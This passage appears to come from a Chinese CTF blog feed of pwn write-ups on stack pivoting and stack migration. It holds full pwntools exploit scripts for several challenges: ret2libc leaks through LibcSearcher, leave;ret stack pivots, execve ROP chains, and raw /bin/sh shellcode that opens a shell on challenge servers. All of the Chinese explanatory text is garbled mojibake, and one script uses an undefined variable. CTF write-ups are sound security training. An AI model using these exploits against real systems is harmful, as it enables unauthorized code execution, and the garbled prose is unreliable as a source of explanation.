read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x200</span>u);  v1 = strlen(m2);  write(<span class="hljs-number">1</span>, m2, v1);                             <span class="hljs-comment">// What do you want to say?</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>u);&#125;</code></pre></div><p>å‘ç°å¯ä»¥åˆ©ç”¨çš„gadgetåªæœ‰ä¸€ä¸ªï¼Œé‚£å°±åªæœ‰leaveçš„gadgetäº†ï¼Œç„¶åæŠŠebpæ§åˆ¶åˆ°å‰é¢çš„readå‡½æ•°çš„så¤„ï¼Œå…¶ä¹Ÿæ˜¯å…¨å±€å˜é‡ï¼Œåœ°å€å›ºå®šã€‚<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p><h4 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ol><li>åœ¨ç¬¬ä¸€ä¸ªreadçš„æ—¶å€™ï¼Œç›´æ¥æŠŠæ„é€ çš„ropé“¾è¯»è¿›å»ã€‚ä»»åŠ¡åˆ†åˆ«æ˜¯leak ä¸€ä¸ªå‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ¥ç”¨libcseacherç®—å‡ºsystemï¼Œè·Ÿ/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¿”å›startå‡½æ•°æ¸…ç†æ ˆå¼€å¯ç¬¬äºŒæ¬¡ä½¿ç”¨æ¼æ´ï¼› call systemï¼ˆ/bin/shï¼‰</li><li>ç„¶åç¬¬äºŒä¸ªreadæ—¶å€™ï¼ŒæŠŠæ§ebpæŒ‡å‘å›ºå®šåœ°å€sçš„åœ°å€ï¼Œretaddress æ”¾ä¸Šleaveçš„gadgetã€‚</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>from LibcSearcher import *e = ELF(<span class="hljs-string">'./spwn'</span>)<span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./spwn'</span>)# libc = e.libc<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28527</span>)padding = <span class="hljs-number">24</span>s = <span class="hljs-number">0x0804A300</span>fake1 = <span class="hljs-number">0x0804A500</span>leave_ret = <span class="hljs-number">0x08048511</span>puts_add = e.symbols[<span class="hljs-string">'puts'</span>]write_plt = e.symbols[<span class="hljs-string">'write'</span>]write_got = e.got[<span class="hljs-string">'write'</span>]<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)p = flat([fake1,write_plt,<span class="hljs-number">0x080483A0</span>,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">10</span>])<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)# raw_input(<span class="hljs-string">'-&gt;'</span>)<span class="hljs-built_in">io</span>.send(p)write_add = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<span class="hljs-built_in">print</span>(hex(write_add))obj = LibcSearcher(<span class="hljs-string">'write'</span>,write_add)libc_base = write_add - obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>) #libc.symbols[<span class="hljs-string">'write'</span>]<span class="hljs-built_in">print</span>(hex(obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>)))<span class="hljs-built_in">print</span>(hex(libc_base))sys_add = libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'system'</span>) #libc.symbols[<span class="hljs-string">'system'</span>]binsh_add =libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'str_bin_sh'</span>) #libc.search(<span class="hljs-string">'/bin/sh\x00'</span>).<span class="hljs-built_in">next</span>()<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)p = flat([fake1,sys_add,<span class="hljs-number">0x080483A0</span>,binsh_add])<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)<span class="hljs-built_in">io</span>.send(p)<span class="hljs-built_in">io</span>.interactive()</code></pre></div><h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ï¿¼ï¿¼ï¿¼ï¿¼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­å¯ä»¥çœ‹åˆ°åé¢çš„readå¤„ï¼Œå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªgadgetå¯ä»¥ç”¨ï¼Œéœ€è¦è€ƒè™‘Stack Migrationã€‚å…¶ä¸­é‚£ä¸ª<strong>sub400a1a</strong>å‡½æ•°æ˜¯é—®ä½ éœ€è¦ç•™ä¸‹å¤šå°‘çš„å­—èŠ‚ï¼Œè‚¯å®šè¦<code>0xe0</code>ï¼Œæ‰€ä»¥å†é€è¿‡å»çš„æ—¶å€™å°±å¡«å…¥0xe0ï¼Œæ­£å¥½åšå‚æ•°ç»™ä¸‹é¢readå‡½æ•°ç”¨ã€‚</p><p>ç„¶åç¨‹åºæ¥å—åˆ°0xe0åï¼Œè¿›å…¥ifè¯­å¥ä¸­ï¼Œä¼šè¾“å‡ºä¸€ä¸‹å †æ ˆespçš„å€¼ï¼Œè¿™ä¸‹ä¹Ÿæ˜¯ç›¸å½“äºçŸ¥é“äº†ä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œç„¶åå°±æ­£å¸¸æ„é€ ropé“¾ï¼ŒæŠŠæ§ebpç­‰äºä¸ºæ¥æ”¶åˆ°çš„stack espï¼Œå†è·Ÿä¸Šleava gadgetå³å¯ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># io = process('./ACTF_2019_babystack')</span><span class="hljs-comment"># io = remote('node3.buuoj.cn',27626)</span>io = remote(<span class="hljs-string">'challenge-848a378609341016.sandbox.ctfhub.com'</span>, <span class="hljs-number">24656</span>)elf = ELF(<span class="hljs-string">'./ACTF_2019_babystack'</span>)<span class="hljs-comment"># libc = elf.libc</span>io.recvuntil(<span class="hljs-string">'message?\n'</span>)io.sendline(<span class="hljs-string">'224'</span>)io.recvuntil(<span class="hljs-string">'saved at'</span>)stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)print(stack_addr)libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]puts_plt = elf.symbols[<span class="hljs-string">'puts'</span>]pop_rdi_ret = <span class="hljs-number">0x000400ad3</span>start_addr = <span class="hljs-number">0x000400800</span>leave_ret = <span class="hljs-number">0x400a18</span> payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'a'</span>)payload += flat([stack_addr,leave_ret])io.recvuntil(<span class="hljs-string">'&gt;'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(payload)io.recvuntil(<span class="hljs-string">'bye~\n'</span>)libc_start_main_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) <span class="hljs-comment">#- libc.symbols['__libc_start_main']</span>obj = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,libc_start_main_addr)libc_base = libc_start_main_addr - obj.dump(<span class="hljs-string">'__libc_start_main'</span>)print(hex(libc_base))io.recvuntil(<span class="hljs-string">'message?\n'</span>)io.sendline(<span class="hljs-string">'224'</span>)io.recvuntil(<span class="hljs-string">'saved at'</span>)stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)print(stack_addr)rec = libc_base + <span class="hljs-number">0x4f2c5</span>payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,rec])payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'\x00'</span>)payload += flat([stack_addr,leave_ret])io.recvuntil(<span class="hljs-string">'&gt;'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰</title>
    <link href="/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <url>/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰"><a href="#èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰" class="headerlink" title="èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰"></a>èŠ±å¼æ ˆæº¢å‡ºï¼ˆæ ˆå¸§çš„è°ƒèŠ‚ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬äººåˆšå­¦pwnä¸ä¹…ï¼Œæœ€è¿‘åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­å­¦åˆ°äº†å„ç§éœ€è¦æ ˆå¸§è°ƒèŠ‚çš„é¢˜ç›®ï¼Œä»¥æ­¤è®°å½•ä¸€ä¸‹ã€‚<br>åœ¨ä¸€äº›æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¼šç¢°åˆ°ä¸€äº›é—®é¢˜ï¼Œä¾‹å¦‚æº¢å‡ºçš„å¯æ§å­—èŠ‚æ•°å¤ªå°‘ï¼Œæ— æ³•æ„é€ æˆ‘ä»¬æƒ³è¦çš„ropé“¾ï¼Œç¨‹åºASLRå¼€å¯åå¯¼è‡´çš„æ ˆåœ°å€ä¸å¯é¢„æµ‹ç­‰ã€‚å¯¹äºè¿™ç§é—®é¢˜ï¼Œå¸¸ç”¨çš„æ€è·¯åŒ…æ‹¬ï¼š</p><ul><li>åŠ å‡espå€¼ï¼Œæ§åˆ¶æ ˆæŒ‡é’ˆ</li><li>Stack Migrationæ¥æ„é€ ä¸€ä¸ªå‡çš„æ ˆå¸§ã€‚</li></ul><p>è¿™é‡Œæ€»ç»“äº†2ç§é¢˜å‹ï¼š</p><h2 id="åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ"><a href="#åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ" class="headerlink" title="åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ"></a>åŠ å‡espï¼ŒæŠŠæ§æ ˆæŒ‡é’ˆ</h2><p>è¿™ç§é¢˜å‹å°±éœ€è¦ç”¨Ropgadgetæ‰¾ä¸€ä¸ªæ§åˆ¶espçš„gadgetï¼Œç„¶åç®€å•ä¿®æ”¹espå€¼çš„å¤§å°ï¼Œæ¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯ä¸€ä¸ªä¿®æ”¹espæ‰©å¤§æ ˆç©ºé—´ï¼Œä»è€Œæ„é€ ropé“¾è·å–shellçš„é¢˜ç›®ã€‚</p><h4 id="æ£€æŸ¥ä¿æŠ¤å’Œarch"><a href="#æ£€æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤å’Œarch"></a>æ£€æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="http://qiqianyun.chumen77.xyz/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p>ç”±äºè¿™ä¸ªç¨‹åºä½¿ç”¨é™æ€ç¼–è¯‘å’Œstripå‘½ä»¤å‰¥ç¦»ç¬¦å·ï¼Œç”¨idaæ‰“å¼€æ²¡æœ‰æˆ‘ä»¬å¹³æ—¶çœ‹çš„é‚£ä¹ˆç®€å•ï¼Œ<br>å¾ˆå¤šå‡½æ•°å·²ç»æ— æ³•è¯†åˆ«ï¼Œæˆ‘ä»¬å°±éœ€è¦è‡ªå·±è°ƒè¯•ï¼Œç„¶åæ¨æµ‹æ˜¯ä»€ä¹ˆå‡½æ•°ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>startå‡½æ•°ä¸­ï¼Œcallçš„å‡½æ•°æ˜¯__libc_start_main, ä¸Šä¸€è¡Œçš„ offsetåˆ™æ˜¯mainå‡½æ•°<br>é‚£ä¸ªç®­å¤´å°±æ˜¯mainå‡½æ•°äº†ã€‚è¿›å…¥mainå‡½æ•°ä»¥åï¼Œ<strong>å¯ä»¥ç»è¿‡syscallä¸­raxçš„å‚æ•°æ¥ç¡®è®¤å…¶æ˜¯ä»€ä¹ˆå‡½æ•°</strong>ï¼Œå¾ˆæ˜æ˜¾ä¸€ä¸ªå‡½æ•°æ˜¯alarmå‡½æ•°ï¼Œå…ˆæ‰‹åŠ¨nopä¸€ä¸‹ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>æŠŠè¿™ä¸ªå‡½æ•°å»é™¤åï¼Œæ–¹ä¾¿gdbçš„åæœŸè°ƒè¯•ã€‚æ¥ç€å¯ä»¥å¾ˆå®¹æ˜“ç¡®å®šä¸€ä¸‹putså‡½æ•°è·Ÿreadå‡½æ•°ï¼Œåœ¨idaä¸­ä¿®æ”¹ä¸€ä¸‹ã€‚<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>ä¸‹é¢é‚£ä¸ª40108eå‡½æ•°æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼Œæˆ‘ç”¨edbåŠ¨æ€è°ƒè¯•æ¥ç¡®å®šå‡ºå…¶ä¸­çš„æŸäº›å‡½æ•°ï¼š<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>å¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œå…ˆç¡®å®šä¸€ä¸‹å…¶å‚æ•°ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dumpè¿‡å»å°±ä¼šå‘ç°æ˜¯å¤åˆ¶äº†ä¸€ä»½ã€‚æ‰€ä»¥å°±ç¡®å®šè¿™ä¸ªå‡½æ•°æ˜¯<code>strncpy</code>æ˜¯å‡½æ•°ã€‚<br>å¯¹äºè¿™ä¸ªå‡½æ•°<code>char *strncpy(char *dest, const char *src, int n)</code><strong>å°†srcæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­nä¸ªå­—ç¬¦å¤åˆ¶åˆ°destæŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­ï¼Œåœ¨ç¬¬ä¸€ä¸ªç©ºå­—ç¬¦å¤„åœæ­¢ï¼Œå¹¶è¿”å›è¢«å¤åˆ¶åçš„dest</strong>ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>å¯¹äºä¸‹ä¸€æ®µå°±æ˜¯åˆ¤æ–­ä¸€ä¸‹ï¼Œæ˜¯å¦ä¸0x79å’Œ0x70ç›¸ç­‰ï¼Œå¯ä»¥æ¥æ‰‹åŠ¨ä¿®æ”¹å€¼è®©å…¶ç›¸ç­‰ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>å¾€åèµ°ä¼šå‘ç°å…ˆæº¢å‡ºäº†ï¼Œåœ¨åšæº¢å‡ºé¢˜çš„æ—¶å€™çœ‹åˆ°return å°±åº”è¯¥æƒ³åŠæ³•æƒ³ä¸Šè·³ã€‚<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>æº¢å‡ºçš„è¿™ä¸ªåœ°å€å°±æ˜¯åˆšåˆšåˆsyrcpyå‡½æ•°å¤åˆ¶è¿‡æ¥0x50å­—èŠ‚ä¸­çš„æœ€å8ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæ˜¯strncpyå‡½æ•°ï¼Œ<strong>æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯ä¸èƒ½æœ‰\x00</strong>ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­ï¼Œä»è€Œæ— æ³•å¤åˆ¶æ»¡0x50å­—èŠ‚åˆ¶é€ å¯æ§æº¢å‡ºï¼Œæ‰€ä»¥å‰0x48ä¸ªå­—èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½å†™å…¥ä»»ä½•åœ°å€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å°±éœ€è¦é€šè¿‡ä¿®æ”¹espæ¥å®Œæˆæ¼æ´åˆ©ç”¨ã€‚</p><p>åœ¨æœ€å‰é¢çš„readå‡½æ•°ä¸­ï¼Œç»™äº†ååˆ†å¤§çš„ç¼“å†²åŒºå¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠROPé“¾æ”¾åœ¨0x50å­—èŠ‚ä¹‹åï¼Œç„¶åé€šè¿‡å¢åŠ espçš„å€¼æŠŠæ ˆé¡¶æŠ¬åˆ°ROPé“¾ä¸Šï¼Œç´§æ¥ç€æ‰§è¡Œè¿™ä¸ªropé“¾å³å¯ã€‚</p><p>æŸ¥åˆ°one_gadgetå‘ç°<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>æ­£å¥½ç¬¦åˆè¦æ±‚ã€‚ç„¶ågdbè°ƒè¯•ä¸€ä¸‹ç¡®å®šä¸€ä¸‹ropé“¾ä»50ä¸ªå­—èŠ‚åçš„é‚£é‡Œå¼€å§‹åˆé€‚å³å¯ã€‚<strong>ï¼ˆè¿™ä¸ªåœ¨æ‰¾onegadgetçš„æ—¶å€™æ³¨æ„ä¸è¦æŠŠrspææˆespäº†ï¼Œè‡ªå·±åœ¨åšçš„æ—¶å€™å› ä¸ºè¿™ä¸ªè°ƒè¯•äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯è¿™ä¸ªé”™è¯¯ï¼Œå¯¼è‡´expä¸æˆåŠŸï¼‰</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *import timeio = process(&apos;./vss&apos;)e = ELF(&apos;./vss&apos;)io.recvuntil(&apos;Password:\n&apos;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&apos;-&gt;&apos;)io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1)))# raw_input(&apos;-&gt;&apos;)sleep(0.1)io.send(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>è¿™ä¸ªnxä¹Ÿæ²¡æœ‰å¼€ï¼Œå¯ä»¥ç”¨æ ˆæ‰§è¡Œshellcode</p><h4 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><div class="hljs"><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&apos;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre></div><p>ä»£ç å¾ˆç®€å•ï¼Œä½†æ˜¯å¯ä»¥å‘ç°å¯ä»¥æº¢å‡ºçš„å­—èŠ‚åªæœ‰50-0x20-4=14ä¸ªå­—èŠ‚å¯æ§ï¼Œæ‰€ä»¥æ˜¯å¾ˆéš¾å†™å‡ºropé“¾æ¥è·å–å’±ä»¬ç›®çš„çš„ã€‚ç„¶åå°±å¯ä»¥è€ƒè™‘æ§åˆ¶æ ˆæŒ‡é’ˆçš„æ”»å‡»æ€è·¯ï¼Œå°±æ˜¯å…ˆæŠŠshellcodeæ‘†åœ¨æ ˆä¸Šï¼Œç„¶åæ§åˆ¶eipåˆ°è¾¾è¿™é‡Œå°±å¯ä»¥äº†ã€‚ä½†æ˜¯ç”±äºç¨‹åºæœ¬èº«ä¼šå¼€å¯ ASLR ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆéš¾ç›´æ¥çŸ¥é“ shellcode çš„åœ°å€ã€‚ä½†æ˜¯æ ˆä¸Šç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºå¯¹ esp è¿›è¡Œæ“ä½œï¼Œä½¿å…¶æŒ‡å‘ shellcode å¤„ï¼Œå¹¶ä¸”ç›´æ¥æ§åˆ¶ç¨‹åºè·³è½¬è‡³ esp å¤„ã€‚</p><p>æ‰¾ä¸€ä¸‹æ§åˆ¶espçš„gadget<br>    0x08048504 : jmp esp<br>ç„¶åæ€ä¹ˆæ§åˆ¶eipåˆ°shellcodeä¸Šå‘¢ï¼Œå› ä¸ºæ²¡æœ‰nxä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µæŒ‡ä»¤æ¥æ§åˆ¶åç§»ï¼š</p><div class="hljs"><pre><code>sub esp,0x28jmp esp</code></pre></div><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *#io = process(&apos;./b0verfl0w&apos;)context.arch = &apos;i386&apos;io = remote(&apos;node3.buuoj.cn&apos;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&apos;?\n&apos;)#raw_input(&apos;-&gt;&apos;)io.sendline(payload)io.interactive()</code></pre></div><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>åœ¨ Stack Migration ä¸­ï¼Œæˆ‘ä»¬æ‰€åˆ©ç”¨çš„æŠ€å·§ä¾¿æ˜¯åŒæ—¶æ§åˆ¶ EBP ä¸ EIPï¼Œè¿™æ ·æˆ‘ä»¬åœ¨æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„åŒæ—¶ï¼Œä¹Ÿæ”¹å˜ç¨‹åºæ ˆå¸§çš„ä½ç½®ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æˆ‘ä»¬çŸ¥é“åœ¨å‡½æ•°å»ºç«‹æ ˆå¸§æ—¶æœ‰ä¸¤æ¡æŒ‡ä»¤<code>push ebp; mov ebp, esp</code>ï¼Œè€Œé€€å‡ºæ—¶åŒæ ·éœ€è¦æ¶ˆé™¤è¿™ä¸¤æ¡æŒ‡ä»¤çš„å½±å“ï¼Œå³<code>leave(mov esp, ebp; pop ebp)</code> ã€‚ä¸”leaveä¸€èˆ¬ç´§è·Ÿç€å°±æ˜¯retã€‚<strong>å› æ­¤ï¼Œåœ¨å­˜åœ¨æ ˆæº¢å‡ºçš„ç¨‹åºä¸­ï¼Œåªè¦æˆ‘ä»¬èƒ½æ§åˆ¶åˆ°æ ˆä¸­çš„ebpï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸¤æ¬¡leaveåŠ«æŒæ ˆã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>ç¬¬ä¸€æ¬¡éšç€ç¨‹åºæµ<code>leave; ret</code>ï¼Œnew espä¸ºæˆ‘ä»¬æ„é€ æ–°æ ˆçš„ç›®æ ‡åœ°å€ã€‚ å¯ä»¥çœ‹åˆ°æ‰§è¡Œåˆ°retæ—¶ï¼Œespè¿˜åœ¨åŸæ¥çš„oldæ ˆä¸Šï¼Œè€Œebpå·²ç»æŒ‡å‘äº†æ–°çš„æ ˆçš„æ ˆé¡¶ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>ç¬¬äºŒæ¬¡è¿›å…¥æˆ‘ä»¬æ”¾å…¥æ ˆä¸Šçš„<code>leave; ret</code> çš„gadgetï¼ˆ<strong>è¿™ä¸ªæ˜¯æˆ‘ä»¬äº‹å…ˆå†™ä¸Šæ ˆçš„</strong>ï¼‰espå·²ç»è¢«æˆåŠŸåŠ«æŒåˆ°æ–°çš„æ ˆä¸Šï¼Œæ‰§è¡Œå®Œgadgetåæ ˆé¡¶ä¼š åœ¨new_esp-4(64ä½æ˜¯-8)çš„ä½ç½®ä¸Šã€‚æ­¤æ—¶æ ˆå®Œå…¨å¯æ§äº†ï¼Œé€šè¿‡é¢„å…ˆæˆ–è€…ä¹‹ååœ¨new stackä¸Šå¸ƒç½®çš„ropé“¾å¯ä»¥è½»æ¾å®Œæˆæ”»å‡»ã€‚<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64ä½"><a 